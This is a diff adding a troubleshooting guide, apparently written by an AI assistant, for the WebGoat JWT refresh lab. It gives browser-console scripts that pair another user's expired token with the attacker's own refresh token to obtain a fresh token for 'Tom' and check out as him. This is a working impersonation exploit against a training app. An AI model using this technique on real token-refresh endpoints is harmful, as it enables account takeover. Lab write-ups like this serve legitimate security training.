@@ -1,0 +1,250 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH - CONSOLE TROUBLESHOOTING                  ║
+║   If nothing happens when you paste scripts              ║
+╚═══════════════════════════════════════════════════════════╝
+
+⚠️ PROBLEM: Nothing happens when you paste Step 2 script
+
+This usually means one of these issues:
+
+═══════════════════════════════════════════════════════════
+
+🔍 ISSUE 1: Script has syntax error or is truncated
+═══════════════════════════════════════════════════════════
+
+The minified script might have been copied incorrectly.
+
+TEST: Paste this simple test in Console:
+
+console.log('✓ Console is working!');
+
+If you see "✓ Console is working!" then the console works.
+
+═══════════════════════════════════════════════════════════
+
+🔍 ISSUE 2: Async function not executing
+═══════════════════════════════════════════════════════════
+
+Try this test:
+
+(async function() {
+    console.log('✓ Async function started');
+    await new Promise(r => setTimeout(r, 100));
+    console.log('✓ Async function completed');
+})();
+
+You should see both messages.
+
+═══════════════════════════════════════════════════════════
+
+🔍 ISSUE 3: window.myRefreshToken not set
+═══════════════════════════════════════════════════════════
+
+Check if Step 1 worked:
+
+console.log('myRefreshToken:', window.myRefreshToken);
+
+If it shows "undefined", you need to set it manually:
+
+window.myRefreshToken = "PASTE_YOUR_ACTUAL_REFRESH_TOKEN_HERE";
+
+═══════════════════════════════════════════════════════════
+
+✅ SOLUTION 1: Use the Debug Version
+═══════════════════════════════════════════════════════════
+
+Instead of the minified script, use the debug version:
+
+File: jwt_refresh_step2_debug.js
+
+This version has:
+- More console output
+- Better error handling
+- Shows what's happening at each step
+- Tells you exactly where it fails
+
+COPY THIS ENTIRE SCRIPT:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+See file: jwt_refresh_step2_debug.js
+(It's too long to paste here, open the file)
+
+Or use the online version below...
+
+═══════════════════════════════════════════════════════════
+
+✅ SOLUTION 2: Manual Step-by-Step
+═══════════════════════════════════════════════════════════
+
+If scripts don't work, do it manually:
+
+STEP 1: Set Tom's token
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+
+STEP 2: Set YOUR refresh token
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Replace with your actual token:
+window.myRefreshToken = 'PASTE_YOUR_REFRESH_TOKEN_HERE';
+
+STEP 3: Request new token for Tom
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+fetch('/WebGoat/JWT/refresh/newToken', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        refresh_token: window.myRefreshToken
+    })
+})
+.then(response => {
+    console.log('Status:', response.status);
+    return response.json();
+})
+.then(data => {
+    console.log('Response:', data);
+    window.tomsNewToken = data.access_token;
+    console.log('Tom\'s new token saved!');
+    console.log('Now run STEP 4');
+})
+.catch(error => {
+    console.error('Error:', error);
+});
+
+STEP 4: Checkout with Tom's token (run AFTER step 3 completes)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+fetch('/WebGoat/JWT/refresh/checkout', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer ' + window.tomsNewToken,
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest'
+    }
+})
+.then(response => response.json())
+.then(data => {
+    console.log('Checkout result:', data);
+    if (data.lessonCompleted) {
+        console.log('🎉 SUCCESS!');
+    }
+})
+.catch(error => {
+    console.error('Error:', error);
+});
+
+═══════════════════════════════════════════════════════════
+
+✅ SOLUTION 3: Check Browser Console Settings
+═══════════════════════════════════════════════════════════
+
+Sometimes console output is filtered:
+
+1. Open DevTools (F12)
+2. Go to Console tab
+3. Check the filter dropdown (top-left of console)
+4. Make sure it's set to "All levels" or "Verbose"
+5. Clear any text in the filter box
+6. Try pasting the script again
+
+═══════════════════════════════════════════════════════════
+
+✅ SOLUTION 4: Use Snippets Instead
+═══════════════════════════════════════════════════════════
+
+If pasting doesn't work:
+
+1. F12 → Sources tab
+2. Left sidebar → Snippets (bottom section)
+3. Click "+ New snippet"
+4. Name it "jwt_refresh_attack"
+5. Paste the script there
+6. Right-click script → Run
+7. Or press Ctrl+Enter
+
+═══════════════════════════════════════════════════════════
+
+🔍 DIAGNOSTIC: Test What Works
+═══════════════════════════════════════════════════════════
+
+Paste each line ONE AT A TIME and press Enter:
+
+console.log('Test 1: Basic console');
+console.log('Test 2: Window object', typeof window);
+console.log('Test 3: Fetch function', typeof fetch);
+console.log('Test 4: Refresh token', window.myRefreshToken);
+
+All 4 tests should show output.
+
+If Test 4 shows "undefined", you need to set it:
+window.myRefreshToken = "your_actual_token_here";
+
+═══════════════════════════════════════════════════════════
+
+🎯 MOST LIKELY CAUSE
+═══════════════════════════════════════════════════════════
+
+If NOTHING appears (not even errors), it means:
+
+1. You didn't press Enter after pasting
+   → Make sure to press Enter!
+
+2. Console is not focused
+   → Click inside the console input area first
+
+3. Script was copied with extra characters
+   → Try copying again from the .js file
+
+4. Browser extension is blocking it
+   → Try in Incognito/Private mode
+
+═══════════════════════════════════════════════════════════
+
+📋 QUICK TEST
+═══════════════════════════════════════════════════════════
+
+Paste this tiny version to see if ANYTHING works:
+
+(function(){console.log('Script executed!');console.log('myRefreshToken:', window.myRefreshToken);})();
+
+If you see "Script executed!" then scripts work.
+If you see "myRefreshToken: undefined" then set it manually.
+If you see NOTHING, then console/pasting has an issue.
+
+═══════════════════════════════════════════════════════════
+
+📁 FILES AVAILABLE
+═══════════════════════════════════════════════════════════
+
+1. jwt_refresh_step2_debug.js
+   → Full script with extensive debugging
+   → Shows every step
+   → Best for troubleshooting
+
+2. JWT_REFRESH_FINAL_SOLUTION.txt
+   → Complete guide with minified scripts
+   → Step-by-step instructions
+
+3. jwt_refresh_console_WORKING.txt
+   → Alternative approaches
+   → Multiple methods
+
+═══════════════════════════════════════════════════════════
+
+💡 RECOMMENDED NEXT STEP
+═══════════════════════════════════════════════════════════
+
+1. Open jwt_refresh_step2_debug.js
+2. Copy the ENTIRE file contents
+3. Go to Console (F12)
+4. Paste it
+5. Press Enter
+6. You should see colored output showing each step
+
+If you still see nothing:
+→ Tell me what browser you're using
+→ Try the manual step-by-step method above
+→ Check if Network tab shows any requests
+
+═══════════════════════════════════════════════════════════
